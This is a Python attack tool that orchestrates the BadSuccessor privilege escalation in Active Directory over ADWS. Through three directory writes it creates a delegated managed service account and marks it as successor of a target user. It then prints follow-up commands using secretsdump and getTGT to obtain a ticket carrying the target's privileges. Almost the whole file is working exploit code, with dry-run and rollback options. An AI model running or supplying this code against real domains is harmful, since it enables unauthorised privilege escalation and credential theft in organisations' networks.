"""
BadSuccessor via ADWS - Yuval Gordon (Akamai), May 2024.

Three ADWS writes to turn a dMSA into a 'successor' of a target user,
then (out of scope here) a Kerberos getTGT to inherit the target's SIDs.
"""
import logging

from soaphound.ad.writers import (
    ws_transfer_create,
    ws_transfer_put,
    ws_transfer_delete,
)

log = logging.getLogger(__name__)


class BadSuccessorOrchestrator:
    def __init__(
        self,
        nmf_client,
        rollback_nmf_client,
        adws_connect,
        dc_fqdn,
        target_dn,
        dmsa_cn,
        dmsa_ou,
        dry_run=False,
        rollback=False,
    ):
        # nmf_client: Windows/ResourceFactory binding, Op 1 Create.
        # rollback_nmf_client: Windows/Resource binding, rollback Delete.
        # adws_connect: ADWSConnect wrapper on Windows/Resource, Op 2 and Op 3 Put.
        self.nmf_client = nmf_client
        self.rollback_nmf_client = rollback_nmf_client
        self.adws_connect = adws_connect
        self.dc_fqdn = dc_fqdn
        self.target_dn = target_dn
        self.dmsa_cn = dmsa_cn
        self.dmsa_ou = dmsa_ou
        self.dry_run = dry_run
        self.rollback_mode = rollback
        # Derived - the trailing `$` is mandatory for Kerberos consistency
        self.dmsa_dn = f"CN={dmsa_cn},{dmsa_ou}"
        self.dmsa_sam = f"{dmsa_cn}$"

    def run(self):
        if self.rollback_mode:
            return self.rollback()
        print(f"[*] BadSuccessor via ADWS - target: {self.target_dn}")
        if self.dry_run:
            print("[*] DRY RUN - payloads will be printed, nothing sent")
        try:
            self._create_dmsa()
            self._put_preceded_by_link()
            self._put_delegated_state()
        except PermissionError as e:
            print(f"[-] {e}")
            return False
        except Exception as e:
            print(f"[-] Unexpected failure: {e}")
            return False
        print("[+] Migration state = 2. dMSA is now ready to supersede target.")
        print("[*] Next steps (manual):")
        print(f"    1. Recover dMSA NT hash via secretsdump: 'secretsdump.py -just-dc-user {self.dmsa_sam} ...'")
        print(f"    2. getTGT.py '{self.dc_fqdn}/{self.dmsa_sam}' -hashes :<hash>")
        print("    3. The resulting TGT contains the target's SIDs")
        return True

    def _create_dmsa(self):
        if self.dry_run:
            print(f"[dry-run] Op 1/3 : would create dMSA at {self.dmsa_dn}")
            return
        try:
            ws_transfer_create(self.nmf_client, self.dc_fqdn, self.dmsa_dn, self.dmsa_sam)
        except PermissionError:
            raise PermissionError(
                f"Op 1/3 failed: insufficientAccessRights - user lacks "
                f"'Create Child' for msDS-DelegatedManagedServiceAccount on {self.dmsa_ou}"
            )
        print(f"[+] Op 1/3 : dMSA created at {self.dmsa_dn}")

    def _put_preceded_by_link(self):
        if self.dry_run:
            print(f"[dry-run] Op 2/3 : would set msDS-ManagedAccountPrecededByLink = {self.target_dn}")
            return
        ok = ws_transfer_put(
            self.adws_connect,
            self.dmsa_dn,
            "addata:msDS-ManagedAccountPrecededByLink",
            self.target_dn,
        )
        if not ok:
            raise RuntimeError(
                "Op 2/3 failed: DC did not acknowledge msDS-ManagedAccountPrecededByLink "
                "(likely < Windows Server 2025, or attribute not supported on target forest)"
            )
        print(f"[+] Op 2/3 : msDS-ManagedAccountPrecededByLink set to {self.target_dn}")

    def _put_delegated_state(self):
        if self.dry_run:
            print("[dry-run] Op 3/3 : would set msDS-DelegatedMSAState = 2")
            return
        ok = ws_transfer_put(
            self.adws_connect,
            self.dmsa_dn,
            "addata:msDS-DelegatedMSAState",
            "2",
        )
        if not ok:
            raise RuntimeError(
                "Op 3/3 failed: DC did not acknowledge msDS-DelegatedMSAState "
                "(likely < Windows Server 2025)"
            )
        print("[+] Op 3/3 : msDS-DelegatedMSAState set to 2")

    def rollback(self):
        if self.dry_run:
            print(f"[dry-run] Rollback : would delete dMSA at {self.dmsa_dn}")
            return True
        try:
            ws_transfer_delete(self.rollback_nmf_client, self.dc_fqdn, self.dmsa_dn)
        except FileNotFoundError:
            print(f"[-] Rollback: dMSA {self.dmsa_cn} not found at {self.dmsa_ou} (already deleted or never created)")
            return False
        except PermissionError:
            print(f"[-] Rollback failed: insufficientAccessRights — user cannot delete {self.dmsa_dn}")
            return False
        except Exception as e:
            print(f"[-] Rollback failed: {e}")
            return False
        print(f"[+] Rollback complete: dMSA {self.dmsa_cn} deleted from {self.dmsa_ou}")
        return True
